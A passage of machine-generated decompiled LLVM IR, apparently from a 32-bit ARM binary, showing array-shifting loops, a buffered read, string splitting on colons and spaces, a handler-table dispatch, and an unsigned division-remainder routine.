  %v2_c42076 = load i32, i32* @global_var_1ad0c.31, align 4
  %v2_c42477 = add i32 %v2_c42076, %v3_c41475
  %v1_c42878 = add i32 %v2_c42477, -4
  br i1 %v3_c40874, label %dec_label_pc_c3b4, label %dec_label_pc_c410

dec_label_pc_c3b4:                                ; preds = %dec_label_pc_c3fc.preheader, %dec_label_pc_c3b4
  %v1_c42882 = phi i32 [ %v1_c428, %dec_label_pc_c3b4 ], [ %v1_c42878, %dec_label_pc_c3fc.preheader ]
  %v2_c42481 = phi i32 [ %v2_c424, %dec_label_pc_c3b4 ], [ %v2_c42477, %dec_label_pc_c3fc.preheader ]
  %v1_c3a879 = phi i32 [ %v1_c3a8, %dec_label_pc_c3b4 ], [ %.pre120, %dec_label_pc_c3fc.preheader ]
  %v1_c3e8 = inttoptr i32 %v2_c42481 to i32*
  %v2_c3e8 = load i32, i32* %v1_c3e8, align 4
  %v2_c3ec = inttoptr i32 %v1_c42882 to i32*
  store i32 %v2_c3e8, i32* %v2_c3ec, align 4
  %v1_c3a8 = add i32 %v1_c3a879, 1
  %v2_c400 = load i32, i32* @global_var_18480.29, align 4
  %v3_c408 = icmp ult i32 %v1_c3a8, %v2_c400
  %v3_c414 = mul i32 %v1_c3a8, 4
  %v2_c420 = load i32, i32* @global_var_1ad0c.31, align 4
  %v2_c424 = add i32 %v2_c420, %v3_c414
  %v1_c428 = add i32 %v2_c424, -4
  br i1 %v3_c408, label %dec_label_pc_c3b4, label %dec_label_pc_c3fc.dec_label_pc_c410_crit_edge

dec_label_pc_c3fc.dec_label_pc_c410_crit_edge:    ; preds = %dec_label_pc_c3b4
  br label %dec_label_pc_c410

dec_label_pc_c410:                                ; preds = %dec_label_pc_c3fc.dec_label_pc_c410_crit_edge, %dec_label_pc_c3fc.preheader
  %v1_c428.lcssa = phi i32 [ %v1_c428, %dec_label_pc_c3fc.dec_label_pc_c410_crit_edge ], [ %v1_c42878, %dec_label_pc_c3fc.preheader ]
  %v2_c430 = inttoptr i32 %v1_c428.lcssa to i32*
  store i32 0, i32* %v2_c430, align 4
  %v2_c438 = load i32, i32* @global_var_18480.29, align 4
  %v1_c43c = add i32 %v2_c438, -1
  store i32 %v1_c43c, i32* @global_var_18480.29, align 4
  %v3_c450 = mul i32 %v1_c43c, 4
  %v1_c454 = add i32 %v3_c450, 4
  %v1_c45c = call i32 @function_f908(i32 %v1_c454)
  %v2_c4b886 = load i32, i32* @global_var_18480.29, align 4
  %v3_c4c088 = icmp eq i32 %v2_c4b886, 0
  br i1 %v3_c4c088, label %dec_label_pc_c4c8, label %dec_label_pc_c474

dec_label_pc_c474:                                ; preds = %dec_label_pc_c410, %dec_label_pc_c474
  %storemerge1589 = phi i32 [ %v1_c4ac, %dec_label_pc_c474 ], [ 0, %dec_label_pc_c410 ]
  %v3_c478 = mul i32 %storemerge1589, 4
  %v2_c484 = add i32 %v3_c478, %v1_c45c
  %v2_c498 = load i32, i32* @global_var_1ad0c.31, align 4
  %v2_c49c = add i32 %v2_c498, %v3_c478
  %v1_c4a0 = inttoptr i32 %v2_c49c to i32*
  %v2_c4a0 = load i32, i32* %v1_c4a0, align 4
  %v2_c4a4 = inttoptr i32 %v2_c484 to i32*
  store i32 %v2_c4a0, i32* %v2_c4a4, align 4
  %v1_c4ac = add i32 %storemerge1589, 1
  %v2_c4b8 = load i32, i32* @global_var_18480.29, align 4
  %v3_c4c0 = icmp ult i32 %v1_c4ac, %v2_c4b8
  br i1 %v3_c4c0, label %dec_label_pc_c474, label %dec_label_pc_c4b4.dec_label_pc_c4c8_crit_edge

dec_label_pc_c4b4.dec_label_pc_c4c8_crit_edge:    ; preds = %dec_label_pc_c474
  br label %dec_label_pc_c4c8

dec_label_pc_c4c8:                                ; preds = %dec_label_pc_c410, %dec_label_pc_c4b4.dec_label_pc_c4c8_crit_edge
  %v2_c4cc = load i32, i32* @global_var_1ad0c.31, align 4
  %v1_c4d4 = call i32 @function_fa5c(i32 %v2_c4cc)
  store i32 %v1_c45c, i32* @global_var_1ad0c.31, align 4
  br label %dec_label_pc_c4e4

dec_label_pc_c4e4:                                ; preds = %dec_label_pc_c36c, %dec_label_pc_c4c8
  %v2_c4f4 = load i32, i32* @global_var_18480.29, align 4
  %v3_c4fc = icmp ult i32 %.pre120, %v2_c4f4
  br i1 %v3_c4fc, label %dec_label_pc_c36c, label %dec_label_pc_c504

dec_label_pc_c504:                                ; preds = %dec_label_pc_c4e4, %dec_label_pc_c4f0.preheader
  %v2_c508 = load i32, i32* @global_var_1abf8.25, align 4
  %v3_c50c = udiv i32 %v2_c508, 32
  %v3_c518 = mul nuw nsw i32 %v3_c50c, 4
  %v2_c520 = add i32 %v3_c518, %v16_c098
  %v2_c524 = add i32 %v2_c520, -436
  %v1_c528 = inttoptr i32 %v2_c524 to i32*
  %v2_c528 = load i32, i32* %v1_c528, align 4
  %v1_c534 = urem i32 %v2_c508, 32
  %v6_c5382 = lshr i32 %v2_c528, %v1_c534
  %v1_c540 = urem i32 %v6_c5382, 2
  %v2_c544 = icmp eq i32 %v1_c540, 0
  br i1 %v2_c544, label %dec_label_pc_c290.lr.ph, label %dec_label_pc_c54c

dec_label_pc_c54c:                                ; preds = %dec_label_pc_c504
  %v5_c570 = call i32 @function_f84c(i32 %v2_c508, i32* nonnull %stack_var_-6600, i32 4096, i32 0)
  %tmp65 = icmp slt i32 %v5_c570, 1
  br i1 %tmp65, label %dec_label_pc_c23c, label %dec_label_pc_c588

dec_label_pc_c588:                                ; preds = %dec_label_pc_c54c
  %v2_c59c = add i32 %v2_c598, %v5_c570
  %v3_c59c = inttoptr i32 %v2_c59c to i8*
  store i8 0, i8* %v3_c59c, align 1
  store i32 %v2_c55c, i32* @r0, align 4
  %v6_c5bc = call i32 @function_f1a0(i32 %v2_c55c, i32 ptrtoint (i32* @global_var_16638.256 to i32), i32 %v2_c59c, i32 %v2_c55c, i32 %v5_c570)
  %v2_c80828 = icmp eq i32 %v6_c5bc, 0
  br i1 %v2_c80828, label %dec_label_pc_c290.lr.ph, label %dec_label_pc_c810

dec_label_pc_c5cc:                                ; preds = %dec_label_pc_c810
  %v2_c5d0 = call i32 @function_85f8(i32 %storemerge30.in)
  %v2_c5d8 = load i8, i8* %storemerge30, align 1
  %v7_c5dc = icmp eq i8 %v2_c5d8, 58
  br i1 %v7_c5dc, label %dec_label_pc_c5fc, label %dec_label_pc_c688

dec_label_pc_c5f0:                                ; preds = %dec_label_pc_c614
  %v1_c5f4 = add i32 %storemerge20, 1
  br label %dec_label_pc_c5fc

dec_label_pc_c5fc:                                ; preds = %dec_label_pc_c5cc, %dec_label_pc_c5f0
  %storemerge20 = phi i32 [ %v1_c5f4, %dec_label_pc_c5f0 ], [ 0, %dec_label_pc_c5cc ]
  store i32 %storemerge30.in, i32* @r0, align 4
  %v0_c604 = call i32 @function_ecc0()
  %v3_c60c = icmp ult i32 %storemerge20, %v0_c604
  br i1 %v3_c60c, label %dec_label_pc_c614, label %dec_label_pc_c5fc.dec_label_pc_c630_crit_edge

dec_label_pc_c5fc.dec_label_pc_c630_crit_edge:    ; preds = %dec_label_pc_c5fc
  %.pre = add i32 %storemerge20, %storemerge30.in
  %.pre31 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_c630

dec_label_pc_c614:                                ; preds = %dec_label_pc_c5fc
  %v2_c620 = add i32 %storemerge20, %storemerge30.in
  %v1_c624 = inttoptr i32 %v2_c620 to i8*
  %v2_c624 = load i8, i8* %v1_c624, align 1
  %v7_c628 = icmp eq i8 %v2_c624, 32
  br i1 %v7_c628, label %dec_label_pc_c630, label %dec_label_pc_c5f0

dec_label_pc_c630:                                ; preds = %dec_label_pc_c614, %dec_label_pc_c5fc.dec_label_pc_c630_crit_edge
  %v3_c644.pre-phi = phi i8* [ %.pre31, %dec_label_pc_c5fc.dec_label_pc_c630_crit_edge ], [ %v1_c624, %dec_label_pc_c614 ]
  %v2_c63c.pre-phi = phi i32 [ %.pre, %dec_label_pc_c5fc.dec_label_pc_c630_crit_edge ], [ %v2_c620, %dec_label_pc_c614 ]
  store i8 0, i8* %v3_c644.pre-phi, align 1
  %v1_c64c = add i32 %storemerge30.in, 1
  %v2_c660 = inttoptr i32 %v1_c64c to i8*
  %v3_c660 = call i32 @function_ed20(i32 %v2_c654, i8* %v2_c660)
  %v1_c674 = add i32 %v2_c63c.pre-phi, 1
  %v3_c680 = inttoptr i32 %v1_c674 to i8*
  %v4_c680 = call i32 @function_ed20(i32 %storemerge30.in, i8* %v3_c680)
  br label %dec_label_pc_c6b8

dec_label_pc_c688:                                ; preds = %dec_label_pc_c5cc
  store i32 42, i32* %stack_var_-2504, align 4
  br label %dec_label_pc_c6b8

dec_label_pc_c6ac:                                ; preds = %dec_label_pc_c6d0
  %v1_c6b0 = add i32 %storemerge17, 1
  br label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c688, %dec_label_pc_c630, %dec_label_pc_c6ac
  %storemerge17 = phi i32 [ %v1_c6b0, %dec_label_pc_c6ac ], [ 0, %dec_label_pc_c630 ], [ 0, %dec_label_pc_c688 ]
  store i32 %storemerge17, i32* @r4, align 4
  store i32 %storemerge30.in, i32* @r0, align 4
  %v0_c6c0 = call i32 @function_ecc0()
  %v0_c6c8 = load i32, i32* @r4, align 4
  %v3_c6c8 = icmp ult i32 %v0_c6c8, %v0_c6c0
  br i1 %v3_c6c8, label %dec_label_pc_c6d0, label %dec_label_pc_c6b8.dec_label_pc_c6ec_crit_edge

dec_label_pc_c6b8.dec_label_pc_c6ec_crit_edge:    ; preds = %dec_label_pc_c6b8
  %.pre32 = add i32 %storemerge17, %storemerge30.in
  %.pre33 = inttoptr i32 %.pre32 to i8*
  br label %dec_label_pc_c6ec

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c6b8
  %v2_c6dc = add i32 %storemerge17, %storemerge30.in
  %v1_c6e0 = inttoptr i32 %v2_c6dc to i8*
  %v2_c6e0 = load i8, i8* %v1_c6e0, align 1
  %v7_c6e4 = icmp eq i8 %v2_c6e0, 32
  br i1 %v7_c6e4, label %dec_label_pc_c6ec, label %dec_label_pc_c6ac

dec_label_pc_c6ec:                                ; preds = %dec_label_pc_c6d0, %dec_label_pc_c6b8.dec_label_pc_c6ec_crit_edge
  %v3_c700.pre-phi = phi i8* [ %.pre33, %dec_label_pc_c6b8.dec_label_pc_c6ec_crit_edge ], [ %v1_c6e0, %dec_label_pc_c6d0 ]
  %v2_c6f8.pre-phi = phi i32 [ %.pre32, %dec_label_pc_c6b8.dec_label_pc_c6ec_crit_edge ], [ %v2_c6dc, %dec_label_pc_c6d0 ]
  store i8 0, i8* %v3_c700.pre-phi, align 1
  %v4_c714 = call i32 @function_ed20(i32 %v2_c708, i8* %storemerge30)
  %v1_c728 = add i32 %v2_c6f8.pre-phi, 1
  %v3_c734 = inttoptr i32 %v1_c728 to i8*
  %v4_c734 = call i32 @function_ed20(i32 %storemerge30.in, i8* %v3_c734)
  %v8_c7c4103 = load i32, i32* bitcast ([4 x i8]** @global_var_180b0.259 to i32*), align 4
  %v2_c7c8105 = icmp eq i32 %v8_c7c4103, 0
  br i1 %v2_c7c8105, label %dec_label_pc_c7d0, label %dec_label_pc_c744

dec_label_pc_c744:                                ; preds = %dec_label_pc_c6ec, %dec_label_pc_c744
  %v7_c7c4108 = phi i32* [ %v7_c7c4, %dec_label_pc_c744 ], [ bitcast ([4 x i8]** @global_var_180b0.259 to i32*), %dec_label_pc_c6ec ]
  %storemerge18106 = phi i32 [ %v1_c7b4, %dec_label_pc_c744 ], [ 0, %dec_label_pc_c6ec ]
  %v7_c74c = load i32, i32* %v7_c7c4108, align 4
  %v2_c760 = inttoptr i32 %v7_c74c to i8*
  %v3_c760 = call i32 @function_f0f4(i8* %v2_c760, i32 %v2_c708)
  %v3_c77c = mul i32 %storemerge18106, 8
  %v2_c784 = add i32 %v3_c77c, add (i32 ptrtoint ([4 x i8]** @global_var_180b0.259 to i32), i32 4)
  %v1_c788 = inttoptr i32 %v2_c784 to i32*
  %v2_c788 = load i32, i32* %v1_c788, align 4
  store i32 %v2_c788, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_c788)
  %v1_c7b4 = add i32 %storemerge18106, 1
  %v5_c7c4 = mul i32 %v1_c7b4, 8
  %v6_c7c4 = add i32 %v5_c7c4, ptrtoint ([4 x i8]** @global_var_180b0.259 to i32)
  %v7_c7c4 = inttoptr i32 %v6_c7c4 to i32*
  %v8_c7c4 = load i32, i32* %v7_c7c4, align 4
  %v2_c7c8 = icmp eq i32 %v8_c7c4, 0
  br i1 %v2_c7c8, label %dec_label_pc_c7d0, label %dec_label_pc_c744

dec_label_pc_c7d0:                                ; preds = %dec_label_pc_c744, %dec_label_pc_c6ec
  %v4_c7e0 = call i32 @function_f0f4(i8* %v3_c7e0, i32 ptrtoint ([6 x i8]* @global_var_1663c.261 to i32))
  %v2_c7e8 = icmp eq i32 %v4_c7e0, 0
  br i1 %v2_c7e8, label %dec_label_pc_c23c, label %dec_label_pc_c7f0

dec_label_pc_c7f0:                                ; preds = %dec_label_pc_c7d0
  store i32 0, i32* @r0, align 4
  %v6_c7f8 = call i32 @function_f1a0(i32 0, i32 ptrtoint (i32* @global_var_16638.256 to i32), i32 ptrtoint ([4 x i8]** @global_var_180b0.259 to i32), i32 %v4_c7e0, i32 ptrtoint (i32* @0 to i32))
  %v2_c808 = icmp eq i32 %v6_c7f8, 0
  br i1 %v2_c808, label %dec_label_pc_c290.lr.ph, label %dec_label_pc_c810

dec_label_pc_c810:                                ; preds = %dec_label_pc_c588, %dec_label_pc_c7f0
  %storemerge30.in = phi i32 [ %v6_c7f8, %dec_label_pc_c7f0 ], [ %v6_c5bc, %dec_label_pc_c588 ]
  %storemerge30 = inttoptr i32 %storemerge30.in to i8*
  %v2_c814 = load i8, i8* %storemerge30, align 1
  %v2_c818 = icmp eq i8 %v2_c814, 0
  br i1 %v2_c818, label %dec_label_pc_c290.lr.ph, label %dec_label_pc_c5cc

; uselistorder directives
  uselistorder i8* %storemerge30, { 2, 1, 0 }
  uselistorder i32 %storemerge30.in, { 10, 9, 6, 3, 2, 5, 4, 8, 1, 0, 7 }
  uselistorder i32* %v7_c7c4, { 1, 0 }
  uselistorder i32 %v1_c7b4, { 1, 0 }
  uselistorder i32 %storemerge18106, { 1, 0 }
  uselistorder i32 %.pre32, { 1, 0 }
  uselistorder i32 %storemerge17, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge20, { 2, 1, 0, 3 }
  uselistorder i32 %v5_c570, { 1, 0, 2 }
  uselistorder i32 %v2_c508, { 2, 1, 0 }
  uselistorder i32 %v1_c4ac, { 1, 0 }
  uselistorder i32 %v3_c478, { 1, 0 }
  uselistorder i32 %storemerge1589, { 1, 0 }
  uselistorder i32 %v1_c45c, { 1, 0 }
  uselistorder i32 %v1_c428, { 1, 0 }
  uselistorder i32 %v2_c424, { 1, 0 }
  uselistorder i32 %v1_c3a8, { 0, 2, 1 }
  uselistorder i32 %v1_c42878, { 1, 0 }
  uselistorder i32 %.pre120, { 1, 4, 0, 3, 2 }
  uselistorder i32 %storemerge13102, { 1, 0 }
  uselistorder i32 %v2_c2bc, { 1, 0 }
  uselistorder i32 %storemerge1225, { 1, 0 }
  uselistorder i32 %v2_c55c, { 0, 2, 1 }
  uselistorder i32 %v2_c27c, { 1, 0 }
  uselistorder i32 %storemerge11, { 2, 0, 1 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_180b0.259 to i32), { 1, 2, 0 }
  uselistorder [4 x i8]** @global_var_180b0.259, { 1, 0 }
  uselistorder i32 (i32)* @function_85f8, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_f1a0, { 1, 0 }
  uselistorder i32* @global_var_1ad0c.31, { 1, 3, 4, 5, 0, 6, 2, 7, 8 }
  uselistorder i32* @global_var_18480.29, { 6, 7, 1, 4, 8, 9, 2, 0, 10, 3, 5, 11 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_cb44, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8374, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 4, 3, 2, 1, 8, 7, 6, 0, 5 }
  uselistorder i32* @global_var_1abf8.25, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 13, 14 }
  uselistorder i32* @global_var_1ad00.142, { 0, 1, 4, 2, 5, 6, 7, 3 }
  uselistorder i32* @global_var_1abf0.41, { 1, 0 }
  uselistorder i32* @global_var_1abf4.187, { 3, 0, 1, 4, 5, 2, 6, 7, 8, 9 }
  uselistorder i32 ()* @function_8688, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_fff4, { 1, 0 }
  uselistorder i32 (i32)* @function_ca44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c810, { 1, 0 }
  uselistorder label %dec_label_pc_c744, { 1, 0 }
  uselistorder label %dec_label_pc_c6b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c5fc, { 1, 0 }
  uselistorder label %dec_label_pc_c4e4, { 1, 0 }
  uselistorder label %dec_label_pc_c4c8, { 1, 0 }
  uselistorder label %dec_label_pc_c474, { 1, 0 }
  uselistorder label %dec_label_pc_c3b4, { 1, 0 }
  uselistorder label %dec_label_pc_c290, { 1, 0 }
  uselistorder label %dec_label_pc_c290.lr.ph, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_c23c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_c19c, { 1, 0 }
  uselistorder label %dec_label_pc_c0dc, { 1, 0 }
}

define i32 @function_c864(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c864:
  store i32 %arg1, i32* @r0, align 4
  %v1_c864 = add i32 %arg2, -1
  %v2_c864 = icmp eq i32 %arg2, 0
  br i1 %v2_c864, label %dec_label_pc_c920, label %dec_label_pc_c86c

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c864
  %v7_c864 = icmp eq i32 %arg2, 1
  br i1 %v7_c864, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_c86c
  %v1_c86c = load i32, i32* @r0, align 4
  %v10_c86c = icmp eq i32 %v1_c86c, %arg2
  br i1 %v10_c86c, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_c86c, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_c86c = icmp ult i32 %v1_c86c, %arg2
  br i1 %v4_c86c, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_c874 = and i32 %v1_c864, %arg2
  %v8_c874 = icmp eq i32 %v6_c874, 0
  br i1 %v8_c874, label %.thread67, label %dec_label_pc_c884.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_c878 = phi i32 [ %v1_c86c, %bb75 ], [ 0, %.thread65 ]
  %v3_c878 = and i32 %v1_c878, %v1_c864
  br label %bb76

dec_label_pc_c884.preheader:                      ; preds = %bb75
  %v2_c88499 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_c88499, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_c914, %bb74, %bb89, %bb84, %dec_label_pc_c8e4, %.thread67
  %v5_c87c = phi i32 [ %v1_c86c, %bb74 ], [ %v3_c878, %.thread67 ], [ %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, %dec_label_pc_c8e4 ], [ 0, %bb84 ], [ %v1_c918, %dec_label_pc_c914 ], [ %v2_c914, %bb89 ]
  ret i32 %v5_c87c

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_c884.preheader
  %v0_c898.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_c884.preheader ], [ %v4_c88c, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_c884.preheader ], [ %v2_c89011, %.thread1.thread9 ]
  br label %dec_label_pc_c898thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_c884.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_c89011, %.thread1.thread9 ], [ 0, %dec_label_pc_c884.preheader ]
  %v0_c898.pr33100 = phi i32 [ %v4_c88c, %.thread1.thread9 ], [ %arg2, %dec_label_pc_c884.preheader ]
  %v4_c888 = icmp ult i32 %v0_c898.pr33100, %v1_c86c
  br i1 %v4_c888, label %bb78, label %dec_label_pc_c898thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_c88c = and i32 %v0_c898.pr33100, 268435456
  %v3_c88c = icmp eq i32 %v2_c88c, 0
  %v4_c88c = mul i32 %v0_c898.pr33100, 16
  br i1 %v3_c88c, label %.thread1.thread9, label %dec_label_pc_c898.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_c89011 = add i32 %storemerge101, 4
  %v2_c884 = icmp ugt i32 %v4_c88c, 268435455
  br i1 %v2_c884, label %.thread, label %bb77

dec_label_pc_c898thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_c898thread-pre-split.loopexit

dec_label_pc_c898thread-pre-split.loopexit:       ; preds = %dec_label_pc_c898thread-pre-split.loopexit.loopexit, %.thread
  %v0_c898.pr3398 = phi i32 [ %v0_c898.pr33.lcssa, %.thread ], [ %v0_c898.pr33100, %dec_label_pc_c898thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_c898thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_c898thread-pre-split

dec_label_pc_c898thread-pre-split:                ; preds = %.thread4, %dec_label_pc_c898thread-pre-split.loopexit
  %v1_c8a439 = phi i32 [ %storemerge95, %dec_label_pc_c898thread-pre-split.loopexit ], [ %v2_c8a4, %.thread4 ]
  %v0_c898.pr = phi i32 [ %v0_c898.pr3398, %dec_label_pc_c898thread-pre-split.loopexit ], [ %v3_c8a0, %.thread4 ]
  br label %dec_label_pc_c898

dec_label_pc_c898.loopexit:                       ; preds = %bb78
  br label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %dec_label_pc_c898.loopexit, %dec_label_pc_c898thread-pre-split
  %v0_c8ac.pr = phi i32 [ %v1_c8a439, %dec_label_pc_c898thread-pre-split ], [ %storemerge101, %dec_label_pc_c898.loopexit ]
  %v1_c8a0 = phi i32 [ %v0_c898.pr, %dec_label_pc_c898thread-pre-split ], [ %v4_c88c, %dec_label_pc_c898.loopexit ]
  %v2_c898 = icmp slt i32 %v1_c8a0, 0
  br i1 %v2_c898, label %dec_label_pc_c8ac, label %bb79

bb79:                                             ; preds = %dec_label_pc_c898
  %v4_c89c = icmp ult i32 %v1_c8a0, %v1_c86c
  br i1 %v4_c89c, label %.thread4, label %dec_label_pc_c8ac

.thread4:                                         ; preds = %bb79
  %v3_c8a0 = mul i32 %v1_c8a0, 2
  %v2_c8a4 = add i32 %v0_c8ac.pr, 1
  br label %dec_label_pc_c898thread-pre-split

dec_label_pc_c8ac:                                ; preds = %bb79, %dec_label_pc_c898
  %v2_c8ac = add i32 %v0_c8ac.pr, -3
  %v5_c8b0 = icmp slt i32 %v0_c8ac.pr, 3
  br i1 %v5_c8b0, label %dec_label_pc_c8f0, label %dec_label_pc_c8b4

dec_label_pc_c8b4:                                ; preds = %dec_label_pc_c8ac, %bb83
  %v6_c8dc = phi i32 [ %v0_c8e4, %bb83 ], [ %v2_c8ac, %dec_label_pc_c8ac ]
  %v1_c8b8 = phi i32 [ %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, %bb83 ], [ %v1_c86c, %dec_label_pc_c8ac ]
  %v3_c8d812 = phi i32 [ %v3_c8d8, %bb83 ], [ %v1_c8a0, %dec_label_pc_c8ac ]
  %v3_c8b4 = icmp ult i32 %v1_c8b8, %v3_c8d812
  %v3_c8b8 = select i1 %v3_c8b4, i32 0, i32 %v3_c8d812
  %v1_c8c0 = sub i32 %v1_c8b8, %v3_c8b8
  %v4_c8bc = udiv i32 %v3_c8d812, 2
  %v6_c8bc = icmp ult i32 %v1_c8c0, %v4_c8bc
  %v6_c8c0 = select i1 %v6_c8bc, i32 0, i32 %v4_c8bc
  %v1_c8c0.v6_c8c0 = sub i32 %v1_c8c0, %v6_c8c0
  %.demorgan = and i1 %v3_c8b4, %v6_c8bc
  %v4_c8c4 = udiv i32 %v3_c8d812, 4
  %v6_c8c4 = icmp ult i32 %v1_c8c0.v6_c8c0, %v4_c8c4
  %v6_c8c8 = select i1 %v6_c8c4, i32 0, i32 %v4_c8c4
  %v1_c8c0.v6_c8c0.v6_c8c8 = sub i32 %v1_c8c0.v6_c8c0, %v6_c8c8
  %.demorgan71 = and i1 %.demorgan, %v6_c8c4
  %v4_c8cc = udiv i32 %v3_c8d812, 8
  %v6_c8cc = icmp ult i32 %v1_c8c0.v6_c8c0.v6_c8c8, %v4_c8cc
  %v6_c8d0 = select i1 %v6_c8cc, i32 0, i32 %v4_c8cc
  %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0 = sub i32 %v1_c8c0.v6_c8c0.v6_c8c8, %v6_c8d0
  %.demorgan72 = and i1 %.demorgan71, %v6_c8cc
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_c8b4
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_c8b4, %bb80
  %v2_c8d4 = add i32 %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, -1
  %v4_c8d4 = sub i32 0, %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0
  %v5_c8d4 = and i32 %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, %v4_c8d4
  %v3_c8d8 = udiv i32 %v3_c8d812, 16
  %v5_c8dc = icmp slt i32 %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, 1
  br i1 %v5_c8dc, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_c8dc = add i32 %v6_c8dc, -4
  %v9_c8dc = sub i32 3, %v6_c8dc
  %v10_c8dc = and i32 %v9_c8dc, %v6_c8dc
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_c8e4 = phi i32 [ %v6_c8dc, %bb81 ], [ %v7_c8dc, %bb82 ]
  %v0_c8e015.in = phi i32 [ %v2_c8d4, %bb81 ], [ %v7_c8dc, %bb82 ]
  %v1_c8e014.in = phi i32 [ %v5_c8d4, %bb81 ], [ %v10_c8dc, %bb82 ]
  %v1_c8e014 = icmp slt i32 %v1_c8e014.in, 0
  %v0_c8e015 = icmp slt i32 %v0_c8e015.in, 0
  %v2_c8e0 = xor i1 %v0_c8e015, %v1_c8e014
  br i1 %v2_c8e0, label %dec_label_pc_c8e4, label %dec_label_pc_c8b4

dec_label_pc_c8e4:                                ; preds = %bb83
  %v1_c8e4 = urem i32 %v0_c8e4, 4
  %v2_c8e4 = icmp eq i32 %v1_c8e4, 0
  br i1 %v2_c8e4, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_c8e4
  %v3_c8e8 = icmp eq i32 %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, 0
  br i1 %v3_c8e8, label %bb76, label %dec_label_pc_c8f0

dec_label_pc_c8f0:                                ; preds = %bb84, %dec_label_pc_c8ac
  %v0_c904 = phi i32 [ %v3_c8d8, %bb84 ], [ %v1_c8a0, %dec_label_pc_c8ac ]
  %v1_c900 = phi i32 [ %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, %bb84 ], [ %v1_c86c, %dec_label_pc_c8ac ]
  %v0_c8f0 = phi i32 [ %v0_c8e4, %bb84 ], [ %v2_c8ac, %dec_label_pc_c8ac ]
  %v5_c8f4 = icmp slt i32 %v0_c8f0, -2
  br i1 %v5_c8f4, label %dec_label_pc_c914, label %dec_label_pc_c8f8

dec_label_pc_c8f8:                                ; preds = %dec_label_pc_c8f0
  %v8_c8f0 = icmp eq i32 %v0_c8f0, -2
  br i1 %v8_c8f0, label %dec_label_pc_c908, label %dec_label_pc_c8fc

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8f8
  %v3_c8fc = icmp ult i32 %v1_c900, %v0_c904
  br i1 %v3_c8fc, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_c8fc
  %v2_c8fc = sub i32 %v1_c900, %v0_c904
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_c8fc, %bb85
  %v0_c90852 = phi i32 [ %v1_c900, %dec_label_pc_c8fc ], [ %v2_c8fc, %bb85 ]
  %v3_c904 = udiv i32 %v0_c904, 2
  br label %dec_label_pc_c908

dec_label_pc_c908:                                ; preds = %dec_label_pc_c8f8, %bb86
  %v0_c910 = phi i32 [ %v0_c904, %dec_label_pc_c8f8 ], [ %v3_c904, %bb86 ]
  %v1_c90c = phi i32 [ %v1_c900, %dec_label_pc_c8f8 ], [ %v0_c90852, %bb86 ]
  %v3_c908 = icmp ult i32 %v1_c90c, %v0_c910
  br i1 %v3_c908, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_c908
  %v2_c908 = sub i32 %v1_c90c, %v0_c910
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_c908, %bb87
  %v0_c91455 = phi i32 [ %v1_c90c, %dec_label_pc_c908 ], [ %v2_c908, %bb87 ]
  %v3_c910 = udiv i32 %v0_c910, 2
  br label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %dec_label_pc_c8f0, %bb88
